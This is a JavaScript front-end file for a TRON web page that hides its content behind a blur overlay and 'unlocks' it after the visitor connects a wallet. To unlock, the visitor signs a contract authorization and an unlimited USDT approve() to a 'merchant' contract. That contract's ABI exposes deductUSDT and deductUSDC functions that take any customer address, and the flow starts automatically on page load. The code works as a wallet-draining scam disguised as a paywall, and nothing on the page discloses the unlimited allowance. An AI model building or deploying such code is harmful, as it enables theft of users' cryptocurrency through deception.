// src/main.js
// 🚨 最終穩定版：極度樂觀，廣播成功即解鎖，無額外狀態檢查 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
// TRON 默認地址 (41開頭的21字節，代表未連接)
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000';

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb; // 保持 TronWeb
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null;
let provider; // 存储钱包提供者

// --- UI 元素 (假設您的 HTML 中有這些 ID) ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');

// --- 辅助函数 ---
function showOverlay(message) {
    if (overlayMessage) overlayMessage.innerHTML = message;
    if (blurOverlay) blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    if (overlayMessage) overlayMessage.innerHTML = '';
    if (blurOverlay) blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        // 如果已授權，隱藏 blurOverlay 和 lockedPrompt
        if (blurOverlay) blurOverlay.style.display = 'none';
        if (lockedPrompt) lockedPrompt.style.display = 'none';
    } else {
        // 如果未授權，顯示 blurOverlay 和 lockedPrompt
        if (blurOverlay) blurOverlay.style.display = 'flex';
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            showOverlay('Connected. Starting authorization process...');
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
            updateContentLock(false); // 恢復鎖定的狀態
            hideOverlay();
        }
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0;

async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);

    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        // 嚴格檢查 txHash 是否有效
        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
            throw new Error(`TronLink/Wallet did not return a valid transaction hash. Possible reasons: operation was canceled or broadcast failed.`);
        }

        // 🚨 樂觀判斷：立即返回成功
        showOverlay(`Step ${txCount}/${totalTxs}: Authorization operation broadcast successful!`);
        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒以緩衝 UI。

        return txHash;

    } catch (error) {
        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
            throw new Error('用戶在錢包中取消了操作。');
        }
        // 捕獲並包裝可能的錯誤訊息
        const errorMessage = error.message || (typeof error === 'string' ? error : 'Unknown error during transaction.');
        throw new Error(`授權操作失敗，錯誤訊息: ${errorMessage}`);
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    // 契約實例化
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


// --- 混合連線邏輯 (TronLink / DApp Browser 優先嘗試) ---
async function connectWalletLogic() {
    console.log("connectWalletLogic called");
    showOverlay('Connecting to wallet...');
    
    // 重置 txCount
    txCount = 0;

    try {
        // ************************************************
        // 1. 首要方案：檢查 TronLink / DApp 瀏覽器環境
        // ************************************************
        if (typeof window.tronWeb !== 'undefined') {
            
            // 由於在 DApp 瀏覽器中，TronWeb 應已準備就緒，我們等待它準備好
            const isReady = await new Promise(resolve => {
                let checkInterval = setInterval(() => {
                    if (window.tronWeb.ready) {
                        clearInterval(checkInterval);
                        resolve(true);
                    }
                }, 100);
                // 設置超時以防萬一
                setTimeout(() => {
                    clearInterval(checkInterval);
                    resolve(window.tronWeb.ready || false); 
                }, 3000); 
            });

            if (isReady) {
                tronWeb = window.tronWeb;
                console.log("Attempting to connect via injected TronWeb (DApp Browser/Extension)");

                let currentAddressHex = tronWeb.defaultAddress.hex;
                
                // 如果地址是默認值，則嘗試請求帳戶以觸發連接彈窗
                if (!currentAddressHex || currentAddressHex === DEFAULT_TRON_ADDRESS_HEX) {
                    if (window.tronLink && window.tronLink.request) {
                        console.log("No address found, requesting accounts via tronLink.request...");
                        try {
                            // 這是觸發連接/授權彈窗的標準方法
                            await window.tronLink.request({ method: 'tron_requestAccounts' });
                            currentAddressHex = tronWeb.defaultAddress.hex; // 重新檢查地址
                        } catch (requestError) {
                            console.error("TronLink requestAccounts failed (User likely canceled):", requestError);
                            showOverlay("Connection failed: Wallet authorization denied or canceled.");
                            return false; 
                        }
                    }
                }
                
                // 檢查最終地址
                if (currentAddressHex && currentAddressHex !== DEFAULT_TRON_ADDRESS_HEX) {
                    userAddress = tronWeb.address.fromHex(currentAddressHex);
                    provider = "TronLink/DApp Browser";
                    console.log("✅ 已使用 TronLink/DApp 环境连接，地址:", userAddress);
                    
                    await initializeContracts();
                    updateConnectionUI(true, userAddress);
                    return true;
                }
            } else {
                 console.warn("TronWeb is present but failed to become ready within the timeout.");
            }
        }
        
        // ************************************************
        // 2. 備用方案: 任何其他（例如 WalletConnect 或其他 TRON 錢包的邏輯）
        // 由於您原始的 WalletConnect 配置不適用於 TRON，這裡暫時留空。
        // ************************************************


        // ************************************************
        // 3. 任何連接都失敗
        // ************************************************
        updateConnectionUI(false);
        showOverlay('🔴 Connection failed: No supported TRON wallet detected or wallet is locked. Please install TronLink.');
        return false;

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        return false;
    }
}

// 舊的檢查邏輯不再需要，因為我們在 connectAndAuthorize 中跳過狀態檢查
// async function checkAuthorization() { ... }

async function connectAndAuthorize() {
    // 🚨 這是極度樂觀的版本，跳過所有狀態檢查，直接發送兩筆交易
    txCount = 0; // 重置交易計數器

    try {
        if (!merchantContract || !tronWeb || !userAddress) {
            throw new Error("Please connect a wallet first.");
        }

        // --- 交易步驟 ---
        const totalSteps = 2; // 總共有 2 個簽名操作 (合約授權 + 代幣 Max 授權)

        // 1. 合約授權 (connectAndAuthorize)
        const methodCallConnect = merchantContract.connectAndAuthorize();
        await sendTransaction(methodCallConnect, "Sending contract authorization operation", totalSteps);

        // 2. Max 扣款授權 (Approve)
        const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
        const tokenContract = usdtContract; // 假設只授權 USDT
        const tokenName = "USDT";
        
        // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
        await sendTransaction(
            tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            `Setting ${tokenName} Max allowance (final step - please approve)`,
            totalSteps
        );
        
        // 由於是極度樂觀模式，兩次廣播成功即視為成功
        return true;
        
    } catch (error) {
        console.error("Authorization Failed:", error);
        // 如果是取消操作，錯誤訊息會更友善
        const displayError = error.message.includes('用戶在錢包中取消了操作') 
            ? 'Authorization canceled by user.' 
            : `Authorization failed! Error message: ${error.message}.`;
            
        showOverlay(`🔴 ${displayError} Please ensure the wallet is unlocked and has sufficient TRX (for gas fees).`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：作為初始化流程執行一次
// ---------------------------------------------
async function handlePostConnection() {
    console.log("handlePostConnection called");
    if (!isConnectedFlag) return;

    // 啟動授權流程
    const authSuccess = await connectAndAuthorize();

    if(authSuccess) {
        showOverlay('✅ Authorization successful! Unlocking data...');
        updateContentLock(true); // 隱藏 lockedPrompt 和 blurOverlay
        await new Promise(resolve => setTimeout(resolve, 1000)); // 讓用戶看到成功訊息
        hideOverlay();
    } else {
        // 授權失敗，保持鎖定狀態，並顯示最後的錯誤訊息
        updateContentLock(false);
    }
}

// ---------------------------------------------
// 主連接入口函數
// ---------------------------------------------
async function connectWallet() {
    console.log("connectWallet called");
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯 (簡單重置狀態)
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        provider = null;
        updateConnectionUI(false);
        updateContentLock(false); 
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 嘗試連接錢包
    const connected = await connectWalletLogic();

    if (connected) {
        await handlePostConnection();
    }

    if (connectButton) connectButton.disabled = false;
}

// ---------------------------------------------
// 頁面啟動和事件監聽器
// ---------------------------------------------

// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);

// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
updateConnectionUI(false);
updateContentLock(false);

// 額外：嘗試在頁面載入時自動連接 (這在 DApp 瀏覽器中最為常見)
// 執行此步驟可以解決 DApp 瀏覽器無法自動連接的問題
window.onload = () => {
    // 延遲執行，確保 window.tronWeb 已經被注入
    setTimeout(async () => {
        // 只有在未連接狀態下才嘗試自動連接
        if (!isConnectedFlag) {
            console.log("Window loaded. Checking for auto-connect...");
            await connectWalletLogic();
            if (isConnectedFlag) {
                await handlePostConnection();
            }
        }
    }, 500); // 給 TronLink 注入時間 
};